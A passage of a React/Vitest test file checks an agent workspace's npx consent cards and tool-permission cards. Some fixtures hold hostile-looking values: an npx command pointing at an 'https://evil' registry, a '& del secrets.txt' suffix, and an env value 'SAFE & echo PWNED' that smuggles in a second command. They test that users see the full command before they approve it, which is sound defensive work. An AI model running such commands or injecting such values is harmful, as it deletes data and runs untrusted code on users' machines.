  it("runs the npx consent flow before creating a session from the + button", async () => {
    vi.mocked(providersList).mockResolvedValue({ providers: [npxProvider], unreadableDirs: 0 });
    root = createRoot(container);
    await act(async () => root.render(<Workspace />));
    await act(async () => undefined);

    const add = container.querySelector<HTMLButtonElement>(".workspace-session-add");
    if (add === null) throw new Error("session add control did not render");
    await act(async () => add.click());
    await act(async () => undefined);

    expect(container.querySelector('[aria-label="Confirm agent"]')).not.toBeNull();
    expect(sessionCreate).not.toHaveBeenCalled();

    const confirm = container.querySelector<HTMLButtonElement>(".workspace-primary-action");
    if (confirm === null) throw new Error("Confirm button did not render");
    await act(async () => confirm.click());
    await act(async () => undefined);

    expect(sessionCreate).toHaveBeenCalledWith("workspace-1", "acp", "codex-acp");
  });

  it("returns focus to the + button when the single-npx consent is cancelled", async () => {
    // With one npx provider no picker opens, so the consent card is the only
    // stop between the triggering button and Escape; cancelling must hand
    // focus back to that button rather than dropping it on the body.
    vi.mocked(providersList).mockResolvedValue({ providers: [npxProvider], unreadableDirs: 0 });
    root = createRoot(container);
    await act(async () => root.render(<Workspace />));
    await act(async () => undefined);

    const add = container.querySelector<HTMLButtonElement>(".workspace-session-add");
    if (add === null) throw new Error("session add control did not render");
    await act(async () => add.click());
    await act(async () => undefined);

    expect(container.querySelector('[aria-label="Confirm agent"]')).not.toBeNull();
    await act(async () => {
      window.dispatchEvent(new KeyboardEvent("keydown", { key: "Escape", bubbles: true }));
    });

    expect(container.querySelector('[aria-label="Confirm agent"]')).toBeNull();
    expect(sessionCreate).not.toHaveBeenCalled();
    expect(document.activeElement).toBe(add);
  });

  it("falls back to sessionCreate without a provider when + is used with none installed", async () => {
    vi.mocked(providersList).mockResolvedValue({ providers: [], unreadableDirs: 0 });
    root = createRoot(container);
    await act(async () => root.render(<Workspace />));
    await act(async () => undefined);

    const add = container.querySelector<HTMLButtonElement>(".workspace-session-add");
    if (add === null) throw new Error("session add control did not render");
    await act(async () => add.click());
    await act(async () => undefined);

    expect(container.querySelector('[aria-label="Choose agent"]')).toBeNull();
    expect(sessionCreate).toHaveBeenCalledWith("workspace-1", "acp");
  });

  it("dismisses the provider popover on Escape without creating", async () => {
    vi.mocked(providersList).mockResolvedValue({
      providers: [grokProvider, claudeProvider],
      unreadableDirs: 0,
    });
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    await act(async () => newWorkspace.click());
    await act(async () => undefined);
    expect(container.querySelector('[aria-label="Choose agent"]')).not.toBeNull();

    await act(async () => {
      window.dispatchEvent(new KeyboardEvent("keydown", { key: "Escape", bubbles: true }));
    });

    expect(container.querySelector('[aria-label="Choose agent"]')).toBeNull();
    expect(sessionCreate).not.toHaveBeenCalled();
  });

  it("adds one workspace when New workspace is clicked twice before providersList resolves", async () => {
    let release:
      | ((value: { providers: (typeof grokProvider)[]; unreadableDirs: number }) => void)
      | undefined;
    const pending = new Promise<{ providers: (typeof grokProvider)[]; unreadableDirs: number }>(
      (resolve) => {
        release = resolve;
      },
    );
    vi.mocked(providersList).mockImplementation(() => pending);
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    const rowsBefore = container.querySelectorAll(".workspace-row").length;

    await act(async () => {
      newWorkspace.click();
      newWorkspace.click();
    });
    expect(container.querySelectorAll(".workspace-row").length).toBe(rowsBefore);
    expect(sessionCreate).not.toHaveBeenCalled();

    await act(async () => {
      if (release === undefined) throw new Error("providersList was not called");
      release({ providers: [grokProvider], unreadableDirs: 0 });
    });
    await act(async () => undefined);

    expect(container.querySelectorAll(".workspace-row").length).toBe(rowsBefore + 1);
    expect(sessionCreate).toHaveBeenCalledTimes(1);
    expect(sessionCreate).toHaveBeenCalledWith("workspace-created", "acp", "grok");
  });

  it("dismisses the provider popover on outside mousedown without creating", async () => {
    vi.mocked(providersList).mockResolvedValue({
      providers: [grokProvider, claudeProvider],
      unreadableDirs: 0,
    });
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    await act(async () => newWorkspace.click());
    await act(async () => undefined);
    expect(container.querySelector('[aria-label="Choose agent"]')).not.toBeNull();

    await act(async () => {
      document.body.dispatchEvent(new MouseEvent("mousedown", { bubbles: true }));
    });

    expect(container.querySelector('[aria-label="Choose agent"]')).toBeNull();
    expect(sessionCreate).not.toHaveBeenCalled();
  });

  it("opens History from the left sidebar", async () => {
    vi.mocked(journalUsage).mockResolvedValue(historyUsage);
    vi.mocked(sessionsList).mockResolvedValue([
      {
        ...terminal("session-1", "shell one"),
        workspaceId: "workspace-rust",
        state: {
          type: "ended",
          generation: 1,
          code: 0,
          integrity: { kind: "complete" },
        },
      },
    ]);
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);
    const history = Array.from(container.querySelectorAll<HTMLButtonElement>("button")).find(
      (button) => button.textContent?.includes("History"),
    );
    if (!history) throw new Error("History button did not render");
    expect(history.getAttribute("aria-controls")).toBe("workspace-history-panel");
    await act(async () => history.click());
    await act(async () => undefined);
    expect(container.querySelector("#workspace-history-panel")).not.toBeNull();
    expect(container.textContent).toContain("Saved build history");
    expect(container.textContent).toContain("workspace-rust");
    expect(sessionDelete).not.toHaveBeenCalled();
  });

  it("keeps workspace and History searches independent across toggles", async () => {
    vi.mocked(journalUsage).mockResolvedValue(historyUsage);
    vi.mocked(sessionsList).mockResolvedValue([]);
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const search = container.querySelector<HTMLInputElement>('input[placeholder="Search"]');
    if (!search) throw new Error("search input did not render");
    const historyToggle = container.querySelector<HTMLButtonElement>(".workspace-history-button");
    if (!historyToggle) throw new Error("History toggle did not render");

    await act(async () => historyToggle.click());
    await act(async () => undefined);
    await act(async () => {
      setSearchValue(search, "history-only");
    });
    expect(search.value).toBe("history-only");
    await act(async () => historyToggle.click());
    expect(search.value).toBe("");
    expect(container.textContent).toContain("main");

    await act(async () => {
      setSearchValue(search, "missing");
    });
    expect(search.value).toBe("missing");
    expect(container.textContent).not.toContain("main");
    await act(async () => historyToggle.click());
    await act(async () => {
      setSearchValue(search, "Saved");
    });
    await act(async () => historyToggle.click());

    expect(search.value).toBe("missing");
    expect(container.textContent).not.toContain("main");
  });

  it("does not render a permission card before typed_permissions is negotiated", async () => {
    root = createRoot(container);
    await act(async () => {
      root.render(
        <WorkspacePermissionCard
          sessionId="session-1"
          subscriptionId={41}
          request={permissionRequest}
          capabilities={[]}
        />,
      );
    });

    expect(container.querySelector(".permission-card")).toBeNull();
    expect(sessionPermissionRespond).not.toHaveBeenCalled();
  });

  it("sends one real allow-once response for a negotiated permission card", async () => {
    root = createRoot(container);
    await act(async () => {
      root.render(
        <WorkspacePermissionCard
          sessionId="session-1"
          subscriptionId={41}
          request={permissionRequest}
          capabilities={["typed_permissions"]}
        />,
      );
    });

    const allow = container.querySelector<HTMLButtonElement>(".permission-card-primary-action");
    if (allow === null) throw new Error("permission allow control did not render");
    await act(async () => {
      allow.click();
      allow.click();
    });

    expect(sessionPermissionRespond).toHaveBeenCalledTimes(1);
    expect(sessionPermissionRespond).toHaveBeenCalledWith(
      "session-1",
      41,
      "tool-test",
      "allow_once",
    );
  });

  it("renders the deny and allow-once controls with their kind classes", async () => {
    const optionsRequest: PermissionRequest = {
      type: "permission_request",
      toolCallId: "tool-a",
      title: "Run command",
      options: [
        { optionId: "allow-once", name: "Allow once", kind: "allow_once" },
        { optionId: "always", name: "Allow for this session", kind: "allow_always" },
        { optionId: "reject", name: "Reject", kind: "reject_once" },
      ],
    };
    root = createRoot(container);
    await act(async () => {
      root.render(
        <WorkspacePermissionCard
          sessionId="session-2"
          subscriptionId={41}
          request={optionsRequest}
          capabilities={["typed_permissions"]}
        />,
      );
    });

    const buttons = [
      ...container.querySelectorAll<HTMLButtonElement>(".permission-card-actions button"),
    ];
    expect(buttons.map((button) => button.textContent)).toEqual(["Deny", "Allow once"]);
    expect(buttons[0].className).toContain("permission-card-secondary-action");
    expect(buttons[0].className).toContain("permission-card-deny-action");
    expect(buttons[1].className).toContain("permission-card-primary-action");
    expect(buttons[1].className).not.toContain("permission-card-deny-action");

    await act(async () => {
      buttons[1].click();
    });
    expect(sessionPermissionRespond).toHaveBeenCalledWith("session-2", 41, "tool-a", "allow_once");
  });

  it("sends the deny outcome without an option id when deny is clicked", async () => {
    root = createRoot(container);
    await act(async () => {
      root.render(
        <WorkspacePermissionCard
          sessionId="session-2"
          subscriptionId={41}
          request={{
            type: "permission_request",
            toolCallId: "tool-a",
            title: "Run command",
            options: [
              { optionId: "allow-once", name: "Allow once", kind: "allow_once" },
              { optionId: "reject", name: "Reject", kind: "reject_once" },
            ],
          }}
          capabilities={["typed_permissions"]}
        />,
      );
    });

    const reject = container.querySelector<HTMLButtonElement>(".permission-card-deny-action");
    if (reject === null) throw new Error("permission reject control did not render");
    await act(async () => {
      reject.click();
    });
    expect(sessionPermissionRespond).toHaveBeenCalledWith("session-2", 41, "tool-a", "deny");
  });

  it("shows a fresh waiting card when a new request replaces one mid-flight", async () => {
    const requestA: PermissionRequest = {
      type: "permission_request",
      toolCallId: "tool-a",
      title: "First command",
      options: [{ optionId: "allow", name: "Allow once", kind: "allow_once" }],
    };
    const requestB: PermissionRequest = {
      type: "permission_request",
      toolCallId: "tool-b",
      title: "Second command",
      options: [{ optionId: "reject", name: "Reject", kind: "reject_once" }],
    };
    let resolveRespond!: (value: undefined) => void;
    const respondGate = new Promise<undefined>((resolve) => {
      resolveRespond = resolve;
    });
    vi.mocked(sessionPermissionRespond).mockImplementationOnce(() => respondGate);
    root = createRoot(container);
    await act(async () => {
      root.render(
        <WorkspacePermissionCard
          key="tool-a"
          sessionId="session-1"
          subscriptionId={41}
          request={requestA}
          capabilities={["typed_permissions"]}
        />,
      );
    });

    const allow = container.querySelector<HTMLButtonElement>(".permission-card-primary-action");
    if (allow === null) throw new Error("permission allow control did not render");
    await act(async () => {
      allow.click();
    });
    expect(container.querySelector(".permission-card-label")?.textContent).toBe(
      "Sending decision…",
    );

    await act(async () => {
      root.render(
        <WorkspacePermissionCard
          key="tool-b"
          sessionId="session-1"
          subscriptionId={41}
          request={requestB}
          capabilities={["typed_permissions"]}
        />,
      );
    });
    expect(container.querySelector(".permission-card-label")?.textContent).toBe("Waiting on you");
    const buttons = [
      ...container.querySelectorAll<HTMLButtonElement>(".permission-card-actions button"),
    ];
    expect(buttons.map((button) => button.textContent)).toEqual(["Deny", "Allow once"]);
    expect(buttons[1].disabled).toBe(true);

    await act(async () => {
      resolveRespond(undefined);
      await respondGate;
    });
    expect(container.querySelector(".permission-card-label")?.textContent).toBe("Waiting on you");
  });

  it("disables every outcome and never responds when no options are offered", async () => {
    root = createRoot(container);
    await act(async () => {
      root.render(
        <WorkspacePermissionCard
          sessionId="session-1"
          subscriptionId={41}
          request={{
            type: "permission_request",
            toolCallId: "tool-legacy",
            title: "Run command",
            options: [],
          }}
          capabilities={["typed_permissions"]}
        />,
      );
    });

    const buttons = [
      ...container.querySelectorAll<HTMLButtonElement>(".permission-card-actions button"),
    ];
    expect(buttons.map((button) => button.textContent)).toEqual(["Deny", "Allow once"]);
    expect(buttons.every((button) => button.disabled)).toBe(true);
    expect(container.textContent).toContain("Deny is not offered for this request.");
    expect(container.textContent).toContain("Allow once is not offered for this request.");
    expect(sessionPermissionRespond).not.toHaveBeenCalled();
  });

  it("renders the permission card inside the conversation, above the composer", async () => {
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const add = container.querySelector<HTMLButtonElement>(".workspace-session-add");
    if (add === null) throw new Error("session add control did not render");
    await act(async () => add.click());
    await act(async () => undefined);

    const emitA = container.querySelector<HTMLButtonElement>("[data-testid=emit-permission-a]");
    if (emitA === null) throw new Error("permission emitter did not render");
    await act(async () => emitA.click());

    const card = container.querySelector(".permission-card");
    if (card === null) throw new Error("permission card did not render");
    const surface = container.querySelector('[data-testid="agent-chat-surface"]');
    if (surface === null) throw new Error("agent chat surface did not render");
    expect(surface.contains(card)).toBe(true);
    const conversation = card.closest(".workspace-conversation");
    expect(conversation).not.toBeNull();
    expect(conversation?.lastElementChild).toBe(card);
    const composer = container.querySelector('[data-testid="mock-composer"]');
    if (composer === null) throw new Error("composer did not render");
    expect(conversation?.compareDocumentPosition(composer)).toBe(Node.DOCUMENT_POSITION_FOLLOWING);
  });

  it("renders the description in its own compact class", async () => {
    root = createRoot(container);
    await act(async () => {
      root.render(
        <WorkspacePermissionCard
          sessionId="session-1"
          subscriptionId={41}
          request={{ ...permissionRequest, description: "This will run the tests" }}
          capabilities={["typed_permissions"]}
        />,
      );
    });

    expect(container.querySelector(".permission-card-description")?.textContent).toBe(
      "This will run the tests",
    );
  });

  it("disables permission outcomes that the request did not offer", async () => {
    root = createRoot(container);
    await act(async () => {
      root.render(
        <WorkspacePermissionCard
          sessionId="session-1"
          subscriptionId={41}
          request={{
            ...permissionRequest,
            options: [{ optionId: "allow", name: "Allow once", kind: "allow_once" }],
          }}
          capabilities={["typed_permissions"]}
        />,
      );
    });

    const deny = container.querySelector<HTMLButtonElement>(".permission-card-deny-action");
    const allow = container.querySelector<HTMLButtonElement>(".permission-card-primary-action");
    if (deny === null || allow === null) throw new Error("permission controls did not render");
    expect(deny.disabled).toBe(true);
    expect(allow.disabled).toBe(false);
    expect(container.textContent).toContain("Deny is not offered for this request.");
    await act(async () => deny.click());
    expect(sessionPermissionRespond).not.toHaveBeenCalled();

    await act(async () => {
      root.render(
        <WorkspacePermissionCard
          sessionId="session-1"
          subscriptionId={41}
          request={{
            ...permissionRequest,
            toolCallId: "tool-reject-only",
            options: [{ optionId: "deny", name: "Deny", kind: "reject_once" }],
          }}
          capabilities={["typed_permissions"]}
        />,
      );
    });
    const rejectOnlyAllow = container.querySelector<HTMLButtonElement>(
      ".permission-card-primary-action",
    );
    if (rejectOnlyAllow === null) throw new Error("permission allow control did not render");
    expect(rejectOnlyAllow.disabled).toBe(true);
    expect(container.textContent).toContain("Allow once is not offered for this request.");
  });

  it("shows the command, args, and cwd that will be spawned", async () => {
    root = createRoot(container);
    await act(async () => {
      root.render(
        <WorkspacePermissionCard
          sessionId="session-1"
          subscriptionId={41}
          request={spawnPermissionRequest}
          capabilities={["typed_permissions"]}
        />,
      );
    });

    const text = container.textContent ?? "";
    expect(text).toContain("cmd.exe");
    expect(text).toContain("/c");
    expect(text).toContain("echo");
    expect(text).toContain("gated");
    expect(text).toContain("C:\\work\\tree");
  });

  it("shows permission requests FIFO and advances after a response", async () => {
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const add = container.querySelector<HTMLButtonElement>(".workspace-session-add");
    if (add === null) throw new Error("session add control did not render");
    await act(async () => add.click());
    await act(async () => undefined);

    const emitA = container.querySelector<HTMLButtonElement>("[data-testid=emit-permission-a]");
    const emitB = container.querySelector<HTMLButtonElement>("[data-testid=emit-permission-b]");
    if (emitA === null || emitB === null) throw new Error("permission emitters did not render");
    await act(async () => emitA.click());
    await act(async () => emitB.click());

    const card = container.querySelector(".permission-card");
    if (card === null) throw new Error("permission card did not render");
    expect(card.textContent).toContain("cmd.exe");
    expect(card.textContent).toContain("alpha");
    expect(card.textContent).not.toContain("ping.exe");

    const allow = container.querySelector<HTMLButtonElement>(".permission-card-primary-action");
    if (allow === null) throw new Error("permission allow control did not render");
    await act(async () => allow.click());
    await act(async () => undefined);

    const next = container.querySelector(".permission-card");
    if (next === null) throw new Error("second permission card did not render");
    expect(next.textContent).toContain("ping.exe");
    expect(next.textContent).toContain("C:\\beta");
    expect(sessionPermissionRespond).toHaveBeenCalledWith("session-2", 41, "tool-a", "allow_once");
  });

  it("adopts the fresh subscription id when the same request is re-emitted after a remount", async () => {
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const add = container.querySelector<HTMLButtonElement>(".workspace-session-add");
    if (add === null) throw new Error("session add control did not render");
    await act(async () => add.click());
    await act(async () => undefined);

    const emitA = container.querySelector<HTMLButtonElement>("[data-testid=emit-permission-a]");
    const emitRenewed = container.querySelector<HTMLButtonElement>(
      "[data-testid=emit-permission-a-renewed]",
    );
    if (emitA === null || emitRenewed === null)
      throw new Error("permission emitters did not render");
    await act(async () => emitA.click());
    await act(async () => emitRenewed.click());

    const allow = container.querySelector<HTMLButtonElement>(".permission-card-primary-action");
    if (allow === null) throw new Error("permission allow control did not render");
    await act(async () => allow.click());
    await act(async () => undefined);

    // The first emit queued subscription 41; the surface then remounted and
    // re-attached with subscription 42. The queued card must respond with 42.
    expect(sessionPermissionRespond).toHaveBeenCalledTimes(1);
    expect(sessionPermissionRespond).toHaveBeenCalledWith("session-2", 42, "tool-a", "allow_once");
  });

  it("quotes args that contain spaces so they are not split visually", async () => {
    root = createRoot(container);
    await act(async () => {
      root.render(
        <WorkspacePermissionCard
          sessionId="session-1"
          subscriptionId={41}
          request={{
            ...spawnPermissionRequest,
            args: ["hello world"],
          }}
          capabilities={["typed_permissions"]}
        />,
      );
    });

    const command = container.querySelector(".permission-card-command")?.textContent ?? "";
    expect(command).toContain('"hello world"');
    expect(command).not.toBe("cmd.exe hello world");
  });

  it("shows the selected session's permission when another session's request is at the head", async () => {
    vi.mocked(sessionsList).mockResolvedValue([
      acpSession("session-a", "agent a"),
      acpSession("session-b", "agent b"),
    ]);
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const emitA = container.querySelector<HTMLButtonElement>("[data-testid=emit-permission-a]");
    if (emitA === null) throw new Error("permission emitter A did not render");
    await act(async () => emitA.click());
    expect(container.querySelector(".permission-card")?.textContent).toContain("alpha");

    const tabB = [...container.querySelectorAll<HTMLButtonElement>(".workspace-session-tab")].find(
      (tab) => tab.textContent?.includes("agent b"),
    );
    if (tabB === undefined) throw new Error("session B tab did not render");
    await act(async () => tabB.click());
    await act(async () => undefined);

    const emitB = container.querySelector<HTMLButtonElement>("[data-testid=emit-permission-b]");
    if (emitB === null) throw new Error("permission emitter B did not render");
    await act(async () => emitB.click());

    const card = container.querySelector(".permission-card");
    if (card === null) throw new Error("selected session B's permission card did not render");
    expect(card.textContent).toContain("ping.exe");
    expect(card.textContent).not.toContain("alpha");
  });

  it("shows the full command including a long suffix the user must see before allowing", async () => {
    const suffix = "& del secrets.txt";
    root = createRoot(container);
    await act(async () => {
      root.render(
        <WorkspacePermissionCard
          sessionId="session-1"
          subscriptionId={41}
          request={{
            ...spawnPermissionRequest,
            command: `${"echo ".padEnd(2100, "x")}${suffix}`,
            args: undefined,
          }}
          capabilities={["typed_permissions"]}
        />,
      );
    });

    expect(container.textContent).toContain(suffix);
    expect(container.textContent).not.toContain("…");
  });

  it("lists env name=value on the permission card when present", async () => {
    root = createRoot(container);
    await act(async () => {
      root.render(
        <WorkspacePermissionCard
          sessionId="session-1"
          subscriptionId={41}
          request={{
            ...spawnPermissionRequest,
            env: [{ name: "DB_GATE", value: "SAFE & echo PWNED" }],
          }}
          capabilities={["typed_permissions"]}
        />,
      );
    });

    const env = container.querySelector(".permission-card-env")?.textContent ?? "";
    expect(env).toContain("DB_GATE=SAFE & echo PWNED");
  });

  it("drops the card when the backend resolves the permission without a UI click", async () => {
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const add = container.querySelector<HTMLButtonElement>(".workspace-session-add");
    if (add === null) throw new Error("session add control did not render");
    await act(async () => add.click());
    await act(async () => undefined);

    const emit = container.querySelector<HTMLButtonElement>("[data-testid=emit-permission-a]");
    const resolved = container.querySelector<HTMLButtonElement>(
      "[data-testid=emit-permission-resolved]",
    );
    if (emit === null || resolved === null) throw new Error("permission emitters did not render");
    await act(async () => emit.click());
    expect(container.querySelector(".permission-card")).not.toBeNull();

    await act(async () => resolved.click());
    expect(container.querySelector(".permission-card")).toBeNull();
    expect(sessionPermissionRespond).not.toHaveBeenCalled();
  });

  it("keeps the other session's card when two sessions share a toolCallId", async () => {
    vi.mocked(sessionsList).mockResolvedValue([
      acpSession("session-a", "agent a"),
      acpSession("session-b", "agent b"),
    ]);
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const emitShared = container.querySelector<HTMLButtonElement>(
      "[data-testid=emit-permission-shared]",
    );
    if (emitShared === null) throw new Error("shared permission emitter did not render");
    await act(async () => emitShared.click());
    expect(container.querySelector(".permission-card")?.textContent).toContain("shared-session-a");

    const tabB = [...container.querySelectorAll<HTMLButtonElement>(".workspace-session-tab")].find(
      (tab) => tab.textContent?.includes("agent b"),
    );
    if (tabB === undefined) throw new Error("session B tab did not render");
    await act(async () => tabB.click());
    await act(async () => undefined);

    const emitB = container.querySelector<HTMLButtonElement>(
      "[data-testid=emit-permission-shared]",
    );
    if (emitB === null) throw new Error("session B shared emitter did not render");
    await act(async () => emitB.click());
    expect(container.querySelector(".permission-card")?.textContent).toContain("shared-session-b");

    const tabA = [...container.querySelectorAll<HTMLButtonElement>(".workspace-session-tab")].find(
      (tab) => tab.textContent?.includes("agent a"),
    );
    if (tabA === undefined) throw new Error("session A tab did not render");
    await act(async () => tabA.click());
    await act(async () => undefined);

    const allow = container.querySelector<HTMLButtonElement>(".permission-card-primary-action");
    if (allow === null) throw new Error("permission allow control did not render");
    await act(async () => allow.click());
    await act(async () => undefined);

    expect(container.querySelector(".permission-card")).toBeNull();
    expect(sessionPermissionRespond).toHaveBeenCalledWith(
      "session-a",
      41,
      "shared-tool",
      "allow_once",
    );

    await act(async () => tabB.click());
    await act(async () => undefined);
    const cardB = container.querySelector(".permission-card");
    if (cardB === null) throw new Error("session B's card vanished after resolving A");
    expect(cardB.textContent).toContain("shared-session-b");
    expect(cardB.textContent).not.toContain("shared-session-a");
    expect(
      cardB.querySelector<HTMLButtonElement>(".permission-card-primary-action")?.disabled,
    ).toBe(false);
  });

  it("shows consent panel when picking an npx provider and does not call create", async () => {
    vi.mocked(providersList).mockResolvedValue({
      providers: [grokProvider, npxProvider],
      unreadableDirs: 0,
    });
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    await act(async () => newWorkspace.click());
    await act(async () => undefined);

    const codexOption = Array.from(
      container.querySelectorAll<HTMLButtonElement>(".workspace-surface-option"),
    ).find((button) => button.textContent?.includes("codex-acp"));
    if (codexOption === undefined) throw new Error("codex-acp option did not render");
    await act(async () => codexOption.click());
    await act(async () => undefined);

    expect(container.querySelector('[aria-label="Confirm agent"]')).not.toBeNull();
    expect(container.textContent).toContain("@agentclientprotocol/codex-acp@1.10.0");
    expect(container.textContent).toContain(
      "npx -y @agentclientprotocol/codex-acp@1.10.0 --registry=https://evil",
    );
    expect(container.textContent).toContain("npx will download and run third-party code");
    expect(sessionCreate).not.toHaveBeenCalled();
  });

  it("names the command and the download in Confirm's accessible description", async () => {
    vi.mocked(providersList).mockResolvedValue({
      providers: [grokProvider, npxProvider],
      unreadableDirs: 0,
    });
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    await act(async () => newWorkspace.click());
    await act(async () => undefined);

    const codexOption = Array.from(
      container.querySelectorAll<HTMLButtonElement>(".workspace-surface-option"),
    ).find((button) => button.textContent?.includes("codex-acp"));
    if (codexOption === undefined) throw new Error("codex-acp option did not render");
    await act(async () => codexOption.click());
    await act(async () => undefined);

    // Focus lands on Confirm when the card opens, so its description is the
    // whole of what a screen-reader user hears before approving a package
    // download. Resolve the ids to their TEXT rather than asserting the
    // attribute exists: the spoken words are the thing under test, and an
    // aria-describedby pointing at a missing or empty node announces nothing
    // while still satisfying an attribute check.
    const confirm = Array.from(container.querySelectorAll<HTMLButtonElement>("button")).find(
      (button) => button.textContent?.trim() === "Confirm",
    );
    if (confirm === undefined) throw new Error("Confirm did not render");
    expect(document.activeElement).toBe(confirm);

    const described = (confirm.getAttribute("aria-describedby") ?? "")
      .split(/\s+/)
      .filter((id) => id.length > 0)
      .map((id) => container.querySelector(`#${id}`)?.textContent ?? "")
      .join(" ");

    expect(described).toContain(
      "npx -y @agentclientprotocol/codex-acp@1.10.0 --registry=https://evil",
    );
    expect(described).toContain("download and run third-party code");
  });

  it("Confirm on consent panel calls create exactly once", async () => {
    vi.mocked(providersList).mockResolvedValue({
      providers: [grokProvider, npxProvider],
      unreadableDirs: 0,
    });
    vi.mocked(sessionCreate).mockResolvedValue({
      ...terminal("session-codex", "Agent"),
      kind: "acp",
    });
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    await act(async () => newWorkspace.click());
    await act(async () => undefined);

    const codexOption = Array.from(
      container.querySelectorAll<HTMLButtonElement>(".workspace-surface-option"),
    ).find((button) => button.textContent?.includes("codex-acp"));
    if (codexOption === undefined) throw new Error("codex-acp option did not render");
    await act(async () => codexOption.click());
    await act(async () => undefined);

    const confirm = container.querySelector<HTMLButtonElement>(".workspace-primary-action");
    if (confirm === null) throw new Error("Confirm button did not render");
    await act(async () => confirm.click());
    await act(async () => undefined);

    expect(sessionCreate).toHaveBeenCalledTimes(1);
    expect(sessionCreate).toHaveBeenCalledWith("workspace-created", "acp", "codex-acp");
    expect(container.querySelector('[aria-label="Confirm agent"]')).toBeNull();
    expect(container.querySelector('[aria-label="Choose agent"]')).toBeNull();
  });

  it("Cancel on consent panel returns to option list without creating", async () => {
    vi.mocked(providersList).mockResolvedValue({
      providers: [grokProvider, npxProvider],
      unreadableDirs: 0,
    });
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    await act(async () => newWorkspace.click());
    await act(async () => undefined);

    const codexOption = Array.from(
      container.querySelectorAll<HTMLButtonElement>(".workspace-surface-option"),
    ).find((button) => button.textContent?.includes("codex-acp"));
    if (codexOption === undefined) throw new Error("codex-acp option did not render");
    await act(async () => codexOption.click());
    await act(async () => undefined);

    expect(container.querySelector('[aria-label="Confirm agent"]')).not.toBeNull();
    const cancel = Array.from(
      container.querySelectorAll<HTMLButtonElement>(".workspace-secondary-action"),
    ).find((button) => button.textContent === "Cancel");
    if (cancel === undefined) throw new Error("Cancel button did not render");
    await act(async () => cancel.click());
    await act(async () => undefined);

    expect(container.querySelector('[aria-label="Confirm agent"]')).toBeNull();
    expect(container.querySelector('[aria-label="Choose agent"]')).not.toBeNull();
    expect(sessionCreate).not.toHaveBeenCalled();
  });

  it("Escape on consent panel returns to option list without creating", async () => {
    vi.mocked(providersList).mockResolvedValue({
      providers: [grokProvider, npxProvider],
      unreadableDirs: 0,
    });
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    await act(async () => newWorkspace.click());
    await act(async () => undefined);

    const codexOption = Array.from(
      container.querySelectorAll<HTMLButtonElement>(".workspace-surface-option"),
    ).find((button) => button.textContent?.includes("codex-acp"));
    if (codexOption === undefined) throw new Error("codex-acp option did not render");
    await act(async () => codexOption.click());
    await act(async () => undefined);

    expect(container.querySelector('[aria-label="Confirm agent"]')).not.toBeNull();

    await act(async () => {
      window.dispatchEvent(new KeyboardEvent("keydown", { key: "Escape", bubbles: true }));
    });

    expect(container.querySelector('[aria-label="Confirm agent"]')).toBeNull();
    expect(container.querySelector('[aria-label="Choose agent"]')).not.toBeNull();
    expect(sessionCreate).not.toHaveBeenCalled();
  });

  it("double-click on Confirm creates only once", async () => {
    vi.mocked(providersList).mockResolvedValue({
      providers: [grokProvider, npxProvider],
      unreadableDirs: 0,
    });
    vi.mocked(sessionCreate).mockResolvedValue({
      ...terminal("session-codex", "Agent"),
      kind: "acp",
    });
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    await act(async () => newWorkspace.click());
    await act(async () => undefined);

    const codexOption = Array.from(
      container.querySelectorAll<HTMLButtonElement>(".workspace-surface-option"),
    ).find((button) => button.textContent?.includes("codex-acp"));
    if (codexOption === undefined) throw new Error("codex-acp option did not render");
    await act(async () => codexOption.click());
    await act(async () => undefined);

    const confirm = container.querySelector<HTMLButtonElement>(".workspace-primary-action");
    if (confirm === null) throw new Error("Confirm button did not render");
    const rowsBefore = container.querySelectorAll(".workspace-row").length;
    await act(async () => {
      confirm.click();
      confirm.click();
    });
    await act(async () => undefined);

    expect(sessionCreate).toHaveBeenCalledTimes(1);
    expect(sessionCreate).toHaveBeenCalledWith("workspace-created", "acp", "codex-acp");
